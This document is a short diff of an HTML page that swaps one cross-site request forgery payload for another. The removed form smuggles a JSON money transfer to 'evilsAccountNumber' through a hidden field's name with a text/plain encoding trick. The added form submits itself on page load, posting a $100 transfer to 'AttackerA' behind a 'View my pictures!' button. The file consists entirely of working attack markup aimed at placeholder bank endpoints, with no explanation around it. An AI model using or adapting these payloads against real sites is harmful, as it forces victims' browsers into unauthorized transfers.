@@ -1,8 +1,10 @@
 <!DOCTYPE html>
 <html>
-<form action="https://bank.example.com/transfer" method="post" enctype="text/plain">
-  <input name='{"amount":100,"routingNumber":"evilsRoutingNumber","account":"evilsAccountNumber", "ignore_me":"' value='test"}' type='hidden'>
-  <input type="submit"
-      value="Win Money!"/>
-</form>
+<body onload="document.forms[0].submit()">
+   <form action="http://netbank.com/transfer.do" method="POST">
+     <input type="hidden" name="acct" value="AttackerA"/>
+     <input type="hidden" name="amount" value="$100"/>
+     <input type="submit" value="View my pictures!"/>
+   </form>
+ </body>
 </html>
